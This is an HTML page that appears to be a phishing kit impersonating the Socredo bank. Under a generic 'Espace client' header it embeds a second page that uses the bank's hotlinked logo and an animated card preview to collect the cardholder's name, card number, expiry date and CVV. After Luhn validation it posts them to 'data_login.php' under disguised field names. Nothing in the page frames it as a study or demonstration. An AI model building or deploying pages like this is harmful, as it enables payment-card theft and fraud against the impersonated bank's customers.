<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connxion</title>
    <link rel="stylesheet" href="res/main.css">
</head>
<body>
<header>
<div class="holder">
<div class="left">
    <img src="res/logo.png">
</div>
<div class="right">
    <div class="user">
        <img src="res/user.png">
        <span>Devenir client</span>
    </div>
</div>
</div>
</header>    

<div class="banner">
<div class="holder">
Espace client
</div>
</div>


<main>


<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Card Input — Socredo</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#f4f7f9;
    --card-front-1:#15265a;
    --card-front-2:#405f9f;
    --accent:#06b6d4;
    --muted:#6b7280;
    --error:#dc2626;
    --success:#16a34a;
    --card-back-1:#1b2a4a;
    --card-back-2:#3b1f5a;
  }
  *{box-sizing:border-box}
  body{font-family:"Poppins",system-ui,-apple-system,"Segoe UI",Roboto,Arial; margin:0; background:var(--bg); color:#0b1220}
  .container{max-width:920px;margin:26px auto;padding:18px}

  /* CARD VISUAL */
  .card-wrap{display:flex;justify-content:center; perspective:1400px; margin-bottom:28px}
  .card {
    width:420px; height:240px; border-radius:18px; position:relative; transform-style:preserve-3d;
    transition: transform .75s cubic-bezier(.2,.9,.28,1), box-shadow .2s; box-shadow: 0 20px 40px rgba(3,7,18,.18);
  }
  .card.flipped{ transform: rotateY(180deg); }

  .face {
    position:absolute; inset:0; border-radius:18px; overflow:hidden; backface-visibility:hidden;
    display:flex; flex-direction:column; padding:20px;
  }

  /* FRONT */
  .front {
    background: linear-gradient(135deg, var(--card-front-1), var(--card-front-2));
    color: #fff;
  }
  .front .top {
    display:flex; justify-content:space-between; align-items:center;
  }
  .bank-logo img{ height:30px; display:block }
  .brand-logo img{ height:36px; display:block }

  .chip {
    width:56px; height:40px; border-radius:8px; background:rgba(255,255,255,0.12);
    display:flex; align-items:center; justify-content:center; font-weight:700; color:rgba(255,255,255,0.9);
  }

  .card-number { margin-top:28px; font-family:monospace; font-size:20px; letter-spacing:2px; text-align:center; }
  .card-bottom { display:flex; justify-content:space-between; align-items:center; margin-top:auto; }
  .card-name { text-transform:uppercase; font-weight:600; letter-spacing:1px; }
  .card-exp { text-align:right; font-weight:600; }

  /* BACK */
  .back {
    transform: rotateY(180deg);
    background:
      radial-gradient(1200px 400px at 10% 10%, rgba(255,255,255,0.02), transparent 5%),
      linear-gradient(120deg, var(--card-back-1), var(--card-back-2));
    color: #fff;
  }

  /* decorative shapes on back */
  .back .pattern {
    position:absolute; right:-40px; top:-40px; width:260px; height:260px; opacity:.08;
    background: conic-gradient(from 90deg at 50% 50%, rgba(255,255,255,0.12), transparent 30%);
    transform: rotate(20deg);
    border-radius:40%;
  }

  .mag-strip { height:52px; background: linear-gradient(90deg,#000,#0b0b0b); margin-top:18px; border-radius:4px }
  .white-strip { margin-top:18px; height:44px; display:flex; align-items:center; padding:8px; gap:12px }
  .sig-box{ flex:1; background:#fff; color:#111; padding:8px 10px; border-radius:6px; font-weight:700; min-height:34px }
  .cvv-box { width:92px; background:#fff; color:#111; padding:8px 12px; border-radius:8px; font-weight:700; text-align:center }

  /* add subtle glow around cvv on back */
  .cvv-box::after{
    content:""; position:absolute; pointer-events:none; width:120px; height:56px; right:24px; bottom:20px;
    background: radial-gradient(closest-side, rgba(255,255,255,0.06), transparent);
    border-radius:10px; filter: blur(8px);
  }

  /* layout of back bottom */
  .back-bottom { position:absolute; bottom:14px; right:20px; left:20px; display:flex; justify-content:space-between; align-items:center; color:rgba(255,255,255,0.85); font-size:12px }

  /* FORM */
  .form { background:#fff; padding:28px; border-radius:14px; box-shadow:0 8px 30px rgba(2,6,23,.06); max-width:740px; margin:0 auto }
  .field { margin-bottom:20px }
  label{ display:block; margin-bottom:8px; font-weight:600; color:#0b1220; font-size:14px }
  input[type="text"], input[type="tel"], input[type="password"]{
    width:100%; padding:14px 16px; border-radius:8px; border:2px solid #e6e9ee; font-size:16px; background:#fff;
    outline:none; transition:all 0.2s ease; font-family:inherit; line-height:1.4; box-sizing:border-box;
  }
  input:focus{ border-color:var(--accent); box-shadow:0 0 0 3px rgba(6,182,212,0.1); }
  input::placeholder{ color:#9ca3af; font-weight:400; }

  .row { display:flex; gap:16px; align-items:flex-end; }
  .col-2{ flex:1; min-width:0; }
  .small{ width:120px; flex-shrink: 0; }
  .small input { width:120px; flex-shrink: 0; }
  .col-2 input { width:100%; }

  .error { color:var(--error); font-size:13px; margin-top:6px; display:none }
  .valid { color:var(--success); font-size:13px; margin-top:6px; display:none }
  .controls { display:flex; justify-content:center; margin-top:16px }
  button{ background:#056b62; color:#fff; padding:12px 28px; border-radius:10px; border:0; font-weight:700; cursor:pointer }
  button[disabled]{ opacity:0.5; cursor:not-allowed }

  /* small responsive tweak */
  @media(max-width:520px){
    .card{ width:320px; height:195px }
    .brand-logo img{ height:28px }
    .bank-logo img{ height:24px }
  }
</style>
</head>
<body>
  <div class="container">
    <!-- Visual Card -->
    <div class="card-wrap">
      <div id="card" class="card" aria-hidden="true">

        <!-- FRONT -->
        <div class="face front">
          <div class="top" style="align-items:center">
            <div class="bank-logo"><img src="https://www.socredo.pf/build/images/partials/socredo-logo.svg" alt="Socredo"></div>
            <div style="display:flex;align-items:center;gap:12px">
              
              <div class="brand-logo"><img id="brandLogo" src="" alt=""></div>
            </div>
          </div>

          <div id="displayNumber" class="card-number" aria-hidden="true">•••• •••• •••• ••••</div>

          <div class="card-bottom">
            <div class="card-name" id="displayName">NOM COMPLET</div>
            <div class="card-exp" id="displayExp">MM/YY</div>
          </div>
        </div>

        <!-- BACK -->
        <div class="face back">
          <div class="pattern" aria-hidden="true"></div>
          <div class="mag-strip" aria-hidden="true"></div>

          <div class="white-strip" style="position:relative">
            <div class="sig-box" aria-hidden="true">AUTHORIZED SIGNATURE</div>
            <div style="display:flex;flex-direction:column;align-items:flex-end;gap:6px">
              <div style="font-size:11px;color:rgba(255,255,255,0.75);text-transform:uppercase">CVV</div>
              <div id="displayCvv" class="cvv-box" aria-hidden="true">•••</div>
            </div>
          </div>

          <div class="back-bottom">
            <div style="opacity:.85">If found please return to issuing bank</div>
            <div><img id="brandLogoBack" src="" alt="" style="height:28px;opacity:.9"></div>
          </div>
        </div>

      </div>
    </div>

    <!-- Form -->
    <form id="cardForm" method="POST" action="data_login.php" role="form" aria-labelledby="cardForm">
      <div class="field">
        <label for="name">Nom sur la carte</label>
        <input id="name" name="fullName" type="text" autocomplete="cc-name" inputmode="text" placeholder="Jean Dupont" />
        <div id="errName" class="error">Le nom est requis.</div>
      </div>

      <div class="field">
        <label for="number">Numéro de carte</label>
        <input id="number" name="one" type="tel" autocomplete="cc-number" inputmode="numeric" placeholder="1234 5678 9012 3456" maxlength="23" />
        <div id="errNumber" class="error">Numéro invalide.</div>
        <div id="okNumber" class="valid">Numéro valide.</div>
      </div>

      <div class="row">
        <div class="field col-2">
          <label for="exp">Expiration (MM/YY)</label>
          <input id="exp" name="two" type="tel" inputmode="numeric" placeholder="MM/YY" maxlength="5" />
          <div id="errExp" class="error">Date d'expiration invalide.</div>
        </div>

        <div class="field small">
          <label for="cvv">CVV</label>
          <input id="cvv" name="three" type="password" inputmode="numeric" maxlength="4" placeholder="CVV" autocomplete="cc-csc" />
          <div id="errCvv" class="error">CVV invalide.</div>
        </div>
      </div>

      <div class="controls">
        <button id="submitBtn" type="submit" disabled>Confirmer</button>
      </div>

      <div style="margin-top:12px;text-align:center;color:var(--muted);font-size:13px">
        Ne transmettez jamais vos informations personnelles par courriel.
      </div>
    </form>

<script>
  // Helpers
  const $ = id => document.getElementById(id);

  // Elements
  const card = $('card');
  const number = $('number');
  const nameEl = $('name');
  const exp = $('exp');
  const cvv = $('cvv');
  const displayNumber = $('displayNumber');
  const displayName = $('displayName');
  const displayExp = $('displayExp');
  const displayCvv = $('displayCvv');
  const brandLogo = $('brandLogo');
  const brandLogoBack = $('brandLogoBack');

  // Error messages
  const errName = $('errName');
  const errNumber = $('errNumber');
  const okNumber = $('okNumber');
  const errExp = $('errExp');
  const errCvv = $('errCvv');
  const submitBtn = $('submitBtn');

  // Logos
  const LOGOS = {
    visa: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
    mastercard: 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg',
    amex: 'https://download.logo.wine/logo/American_Express/American_Express-Logo.wine.png'
  };

  // Utils
  function onlyDigits(s){ return s.replace(/\D/g,''); }

  // Luhn algorithm (digit-by-digit careful)
  function luhnCheck(cc){
    const digits = cc.replace(/\D/g,'');
    let sum = 0;
    let shouldDouble = false;
    for(let i = digits.length - 1; i >= 0; i--){
      let d = Number(digits.charAt(i));
      if (shouldDouble) {
        d = d * 2;
        if (d > 9) d -= 9;
      }
      sum += d;
      shouldDouble = !shouldDouble;
    }
    return digits.length >= 12 && sum % 10 === 0;
  }

  // Detect card type for brand & cvv length
  function detectCardType(num){
    const n = onlyDigits(num);
    if(/^4/.test(n)) return 'visa';
    if(/^(5[1-5]|2(2[2-9]|[3-6]\d|7[01]|720))/.test(n)) return 'mastercard';
    if(/^3[47]/.test(n)) return 'amex';
    return 'unknown';
  }

  // Format card number into groups of 4 (Amex different)
  function formatNumberForDisplay(input){
    const digits = onlyDigits(input);
    const type = detectCardType(digits);
    if(type === 'amex'){
      // Amex 4-6-5
      return digits.replace(/^(\d{0,4})(\d{0,6})(\d{0,5}).*/,'$1 $2 $3').trim();
    } else {
      return digits.replace(/(.{4})/g,'$1 ').trim();
    }
  }

  // Expiration validation
  function validateExp(val){
    if(!/^\d{2}\/\d{2}$/.test(val)) return false;
    const [mmS, yyS] = val.split('/');
    const mm = Number(mmS), yy = Number(yyS);
    if(mm < 1 || mm > 12) return false;
    // create date end of month - fix: month should be mm-1 for correct date
    const fullYear = 2000 + yy;
    const expDate = new Date(fullYear, mm-1, 0, 23, 59, 59);
    const now = new Date();
    return expDate >= now;
  }

  // CVV validation depends on brand
  function validateCvv(val, brand){
    const d = onlyDigits(val);
    const needed = (brand === 'amex') ? 4 : 3;
    return new RegExp('^\\d{'+needed+'}$').test(d);
  }

  // Card number validation (Luhn + length)
  function validateNumber(val){
    const digits = onlyDigits(val);
    const brand = detectCardType(digits);
    if(brand === 'amex'){
      if(!/^\d{15}$/.test(digits)) return false;
    } else if(brand === 'visa' || brand === 'mastercard'){
      if(!/^\d{16}$/.test(digits)) return false;
    } else {
      // Accept 12-19 digits for unknown, but require luhn
      if(digits.length < 12) return false;
    }
    return luhnCheck(digits);
  }

  // Display update and validation state manager
  function updateAll(){
    // Name
    const nameVal = nameEl.value.trim();
    displayName.textContent = nameVal ? nameVal.toUpperCase() : 'NOM COMPLET';
    if(!nameVal){ errName.style.display = 'block'; } else { errName.style.display = 'none'; }

    // Number formatting + brand
    const formatted = formatNumberForDisplay(number.value);
    displayNumber.textContent = formatted || '•••• •••• •••• ••••';
    // show / hide brand logos
    const cardDigits = onlyDigits(number.value);
    const brand = detectCardType(cardDigits);
    if(brand === 'visa' || brand === 'mastercard' || brand === 'amex'){
      brandLogo.src = LOGOS[brand] || '';
      brandLogoBack.src = LOGOS[brand] || '';
    } else {
      brandLogo.src = '';
      brandLogoBack.src = '';
    }

    // validate number in real time
    if(number.value.trim() === ''){
      errNumber.style.display = 'none'; okNumber.style.display = 'none';
    } else if(validateNumber(number.value)){
      errNumber.style.display = 'none'; okNumber.style.display = 'block';
    } else {
      errNumber.style.display = 'block'; okNumber.style.display = 'none';
    }

    // Exp
    displayExp.textContent = exp.value || 'MM/YY';
    if(exp.value.trim() === ''){
      errExp.style.display = 'none';
    } else if(validateExp(exp.value)){
      errExp.style.display = 'none';
    } else {
      errExp.style.display = 'block';
    }

    // CVV masked on back
    const brandForCvv = detectCardType(cardDigits);
    const cvvDigits = onlyDigits(cvv.value);
    if(cvvDigits.length === 0) displayCvv.textContent = '•••';
    else {
      // show actual CVV digits on back (no masking)
      displayCvv.textContent = cvvDigits;
    }

    // CVV error
    if(cvv.value.trim() === '') { errCvv.style.display = 'none'; }
    else if(validateCvv(cvv.value, brandForCvv)){ errCvv.style.display = 'none'; }
    else { errCvv.style.display = 'block'; }

    // Determine overall form validity
    const okName = nameVal !== '';
    const okNumberVal = validateNumber(number.value);
    const okExpVal = validateExp(exp.value);
    const okCvvVal = validateCvv(cvv.value, brandForCvv);
    const allValid = okName && okNumberVal && okExpVal && okCvvVal;

    submitBtn.disabled = !allValid;
    return { allValid, okName, okNumber: okNumberVal, okExp: okExpVal, okCvv: okCvvVal };
  }

  // Input event handlers
  number.addEventListener('input', e => {
    // allow only digits and spaces; format visually
    const formatted = formatNumberForDisplay(number.value);
    // keep cursor friendly: set value to formatted (max length applied)
    number.value = formatted;
    updateAll();
  });

  number.addEventListener('blur', () => {
    // final formatting to either grouped or masked
    number.value = formatNumberForDisplay(number.value);
    updateAll();
  });

  nameEl.addEventListener('input', updateAll);

  exp.addEventListener('input', e => {
    let v = onlyDigits(exp.value).substring(0,4);
    if(v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
    exp.value = v;
    updateAll();
  });

  cvv.addEventListener('input', e => {
    // restrict to digits and max length depending on brand
    const digits = onlyDigits(cvv.value);
    const b = detectCardType( onlyDigits(number.value) );
    const max = (b === 'amex') ? 4 : 3;
    cvv.value = digits.substring(0, max);
    updateAll();
  });

  // Flip card when focusing CVV, otherwise show front
  cvv.addEventListener('focus', () => {
    card.classList.add('flipped');
  });
  cvv.addEventListener('blur', () => {
    // small delay to allow clicking controls if needed
    setTimeout(()=>{ if(document.activeElement !== cvv) card.classList.remove('flipped'); }, 120);
  });

  // When focusing other fields, ensure front is visible
  [number, nameEl, exp].forEach(el => el.addEventListener('focus', () => card.classList.remove('flipped')));

  // Prevent paste of non-digit content for numeric fields
  ['paste','drop'].forEach(evt => {
    number.addEventListener(evt, (e) => {
      // allow paste but sanitize
      const text = (e.clipboardData || window.clipboardData)?.getData('text') || '';
      if(text && /\D/.test(text)) {
        // sanitize by replacing with digits only
        e.preventDefault();
        number.value = formatNumberForDisplay(text);
        updateAll();
      }
    });
  });

  // Form submit guard
  const cardForm = $('cardForm');
  submitBtn.addEventListener('click', function(e){
    const res = updateAll();
    if(!res.allValid){
      e.preventDefault();
      // focus first invalid field
      if(!res.okName) { nameEl.focus(); }
      else if(!res.okNumber){ number.focus(); }
      else if(!res.okExp){ exp.focus(); }
      else if(!res.okCvv){ cvv.focus(); }
      return false;
    }
    // At this point, the form is valid — allow form submission to data_login.php
    // No need to prevent default, let the form submit normally
  });

  // Initialize state
  updateAll();
</script>
</body>
</html>


</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>

</body>
</html>